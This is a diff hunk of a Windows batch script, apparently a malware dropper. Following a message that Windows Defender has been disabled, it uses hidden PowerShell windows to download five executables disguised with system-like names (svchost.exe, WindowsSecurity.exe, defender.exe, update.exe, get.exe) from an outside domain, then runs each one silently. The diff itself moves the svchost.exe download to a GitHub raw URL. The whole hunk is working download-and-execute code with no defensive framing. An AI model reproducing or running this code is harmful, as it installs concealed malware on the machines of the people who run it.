@@ -23,7 +23,7 @@ echo Windows Defender has been disabled.
 :: Function to download and execute files
 :download_and_execute_files
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/defender.exe', 'C:\Users\%USERNAME%\Downloads\defender.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\defender.exe' -WindowStyle Hidden"
-powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/svchost.exe', 'C:\Users\%USERNAME%\Downloads\svchost.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\svchost.exe' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/fviatool/fvia/main/svchost.exe', 'C:\Users\%USERNAME%\Downloads\svchost.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\svchost.exe' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/WindowsSecurity.exe', 'C:\Users\%USERNAME%\Downloads\WindowsSecurity.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\WindowsSecurity.exe' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/update.exe', 'C:\Users\%USERNAME%\Downloads\update.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.exe' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/get.exe', 'C:\Users\%USERNAME%\Downloads\get.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\get.exe' -WindowStyle Hidden"
